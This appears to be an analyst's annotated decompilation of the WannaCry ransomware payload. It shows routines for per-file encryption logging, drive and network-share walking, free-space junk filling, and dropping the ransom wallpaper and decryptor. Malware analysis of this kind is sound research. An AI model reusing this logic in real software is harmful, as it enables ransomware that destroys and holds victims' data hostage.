// payload.dll batch 3 — file encryption callbacks, drive/share walks, wallpaper, junk writer

// ===== 0x10005290 sub_10005290 — ENCRYPTION CALLBACK (per file) =====
// called by walker for every candidate file; a6!=0 => was encrypted, log to f.wry
int __stdcall sub_10005290(int a1, LPCWCH lpWideCharStr, unsigned int a3, unsigned int a4, int a5, int a6) {
  ++dword_1000F264;
  qword_1000F268 += __PAIR64__(a3, a4);   // total bytes counter
  if ( a6 != 0 ) {
    v6 = fopen(aFWry, aAt);                // f.wry append
    if ( v6 != nullptr ) {
      WideCharToMultiByte(0, 0, lpWideCharStr, -1, MultiByteStr, 619, nullptr, nullptr);
      fprintf(v6, "%s\n", MultiByteStr); fclose(v6);
    }
  }
  return 1;
}

// ===== 0x10001a70 sub_10001A70 — crypto context init + 1MB buffers + StartAddress thread =====
HCRYPTPROV __thiscall sub_10001A70(HCRYPTPROV *lpParameter, const CHAR *hPubKey, int a3, int a4) {
  result = sub_10003CF0(lpParameter + 1, hPubKey, nullptr);   // RSA keypair for this run
  if ( result != 0 ) {
    if ( hPubKey != nullptr ) sub_10003CF0(lpParameter + 11, nullptr, nullptr);
    result = GlobalAlloc(0, 0x100000u); *(lpParameter + 306) = result;
    if ( result != 0 ) {
      result = GlobalAlloc(0, 0x100000u); *(lpParameter + 307) = result;
      if ( result != 0 ) {
        *(lpParameter + 311) = CreateEventA(nullptr, true, false, nullptr);
        *(lpParameter + 312) = CreateEventA(nullptr, true, false, nullptr);
        *(lpParameter + 310) = CreateThread(nullptr, 0, StartAddress, lpParameter, 0, nullptr);
        *(lpParameter + 308) = a4;   // &dword_1000F2D8 (stop flag)
        *(lpParameter + 309) = a3;   // progress callback
        srand(GetTickCount());
        return 1;
      }
    }
  }
  return result;
}

// ===== 0x100017a0 sub_100017A0 — encryption context ctor =====
char *__thiscall sub_100017A0(char *this) {
  sub_10003C40(this + 4); sub_10003C40(this + 44); sub_10006230(this + 84);
  *((_DWORD *)this + 306..309) = 0;
  v2 = operator new(0x18u); *v2 = v2; v2[1] = v2;   // std::list head
  *((_DWORD *)this + 315) = v2; *((_DWORD *)this + 316) = 0;
  *((_DWORD *)this + 310..313) = 0;
  *((_WORD *)this + 634) = 0; *((_WORD *)this + 894) = 0;
  *((_DWORD *)this + 577..580) = 0;
  *(_DWORD *)this = &off_10008268;
  return this;
}

// ===== 0x100018a0 sub_100018A0 — context dtor =====
int __thiscall sub_100018A0(char *this) { /* frees std::list of wstrings, dtor sub_10006260, critical sections */ }

// ===== 0x100053c0 sub_100053C0 — encrypt user profile dirs first =====
int __cdecl sub_100053C0(int a1) {
  SHGetFolderPathW(nullptr, 0, nullptr, 0, pszPath);   // CSIDL_DESKTOP
  if ( wcslen(pszPath) != 0 ) sub_10002A20(pszPath);
  pszPath[0] = 0;
  SHGetFolderPathW(nullptr, 5, nullptr, 0, pszPath);   // CSIDL_PERSONAL (My Documents)
  if ( wcslen(pszPath) != 0 ) sub_10002A20(pszPath);
  sub_10004A10(25, (int)sub_10005340, a1);   // CSIDL_COMMON_DOCUMENTS
  return sub_10004A10(46, (int)sub_10005340, a1);  // CSIDL_COMMON_ADMINTOOLS
}

// ===== 0x10005530 sub_10005530 — encrypt one drive root =====
void __cdecl sub_10005530(int a1, LONG Value, int a3) {
  DirectoryName = "<X>:";
  if ( a3 != 0 ) {
    if ( GetDriveTypeW(DirectoryName) == 5 ) return;   // skip CDROM
    InterlockedExchange(&Target, Value);
LABEL_12:
    if ( GetDriveTypeW(DirectoryName) == 3 ) {   // fixed drive: root scan
      sub_10005020(Value, Source); sub_10001B60(Source);
    }
    sub_10002A20(DirectoryName);   // walk whole drive
  } else if ( InterlockedExchangeAdd(&Target, 0) != Value ) {
    // wait for drive to be ready (up to 30s)
    while ( !GetDiskFreeSpaceExW(...) || TotalNumberOfBytes == 0 ) { Sleep(1000); if (++v3>=30) return; }
    if ( GetDriveTypeW(DirectoryName) != 5 ) { ... LABEL_12 ... }
  }
}

// ===== 0x10005670 sub_10005670 — new-drive handler thread =====
DWORD sub_10005670(int a1, LPVOID lpThreadParameter) {
  sub_100017A0(Parameter);
  if ( sub_10001A70(Parameter, FileName, sub_10005290, &dword_1000F2D8) != 0 ) {
    sub_10005530(Parameter, (LONG)lpThreadParameter, 0);
    sub_10005120(lpThreadParameter);   // shadow copies / junk fill
    sub_10001980(Parameter, a1);
    ExitThread(0);
  }
  sub_100018A0(Parameter); return 0;
}

// ===== 0x10005480 sub_10005480 — remote share enumerator callback =====
int __stdcall sub_10005480(const char *a1, wchar_t *String1, int a3, int a4) {
  if ( wcsicmp(String1, L"ADMIN$") != 0 ) {   // skip admin share
    sprintf(Buffer, "\\\\%s\\", a1);
    MultiByteToWideChar(0, 0, Buffer, -1, WideCharStr, 260);
    wcscat(WideCharStr, String1);
    sub_10002A20(WideCharStr);   // encrypt the share
  }
  return 1;
}

// ===== 0x10004920 sub_10004920 — launch decryptor exe (hidden) =====
BOOL sub_10004920() {
  StartupInfo.cb = 68; StartupInfo.dwFlags = 1; StartupInfo.wShowWindow = 5;
  result = CreateProcessA(nullptr, NewFileName, ..., CREATE_NO_WINDOW 0x8000000u, ...);
  if ( result ) { WaitForSingleObject(hProcess, INFINITE); CloseHandle(hProcess); return CloseHandle(hThread); }
  return result;
}

// ===== 0x10005120 sub_10005120 — shadow-copy kill / disk-fill for a drive =====
HGLOBAL __cdecl sub_10005120(int a1) {
  RootPathName = "<X>:";
  if ( GetDriveTypeW(...) != 3 ) return;
  v2 = GlobalAlloc(0, 0xA00000u);   // 10MB
  memset(v2, 0x55, 0xA00000u);
  sub_100050B0(a1, FileName);      // random junk filename
  FileW = CreateFileW(FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
  MoveFileExW(FileName, nullptr, 4u);   // MOVEFILE_DELAY_UNTIL_REBOOT (delete on reboot)
  while ( free space > 1GB ) { write 10MB x20; Sleep(10s); }   // fill free space
  GlobalFree(v2); FlushFileBuffers(FileW); CloseHandle(FileW); DeleteFileW(FileName);
}

// ===== 0x10004a10 sub_10004A10 — CSIDL subfolder enumerator =====
int __cdecl sub_10004A10(int csidl, callback a2, int a3) {
  SHGetFolderPathW(nullptr, csidl, nullptr, 0, pszPath);
  // strip last component; if csidl==46 also use CSIDL_PERSONAL base
  swprintf(Buffer, aS_0, pszPath);   // "%s*"
  hFindFile = FindFirstFileW(Buffer, &FindFileData);
  do {
    if ( not . or .. and DIRECTORY ) {
      swprintf(Buffer, aSSS, pszPath, FindFileData.cFileName, v5);
      a2(Buffer, FindFileData.cFileName, a3);
      if ( v3 != nullptr && wcscmp(v5, v3) != 0 ) { swprintf(Buffer, aSSS, pszPath, FindFileData.cFileName, v3); a2(...); }
    }
  } while ( FindNextFileW(...) );
  FindClose(hFindFile);
}

// ===== 0x10004ee0 sub_10004EE0 — drop wallpaper bmp + decryptor copies into folder =====
int __stdcall sub_10004EE0(wchar_t *Format, wchar_t *String2, int a3) {
  swprintf(Buffer, aSS_0, Format, aWannacryptorBm);   // "%s\\@WanaCryptor.bmp"
  MultiByteToWideChar(0, 0, MultiByteStr, -1, WideCharStr, 259);
  if ( CopyFileW(WideCharStr, Buffer, false) ) {
    GetUserNameW(String1, &pcbBuffer);
    if ( wcsicmp(String1, String2) == 0 ) SystemParametersInfoW(0x14u, 0, Buffer, 1u);  // SPI_SETDESKWALLPAPER
  }
  swprintf(Buffer, aSS_0, Format, aWannadecryptor_1);
  CopyFileW(aWannadecryptor_1, Buffer, false);   // copy decryptor into dir
  return 1;
}
